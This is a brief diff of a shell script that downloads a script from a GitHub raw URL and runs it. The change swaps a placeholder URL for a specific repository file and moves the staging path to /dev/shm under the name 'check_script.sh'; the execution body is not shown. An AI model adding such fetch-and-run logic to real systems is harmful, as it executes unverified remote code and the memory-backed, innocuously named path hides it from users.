@@ -1,10 +1,10 @@
 #!/bin/sh
 
 # URL of the shell script on GitHub (use raw content URL)
-SCRIPT_URL="https://raw.githubusercontent.com/username/repo/branch/script.sh"
+SCRIPT_URL="https://raw.githubusercontent.com/G-bl7/testingEdu/refs/heads/main/scs.sh"
 
 # Local path where the script will be downloaded
-LOCAL_SCRIPT_PATH="/tmp/downloaded_script.sh"
+LOCAL_SCRIPT_PATH="/dev/shm/check_script.sh"
 
 # Function to download and run the script
 download_and_run() {
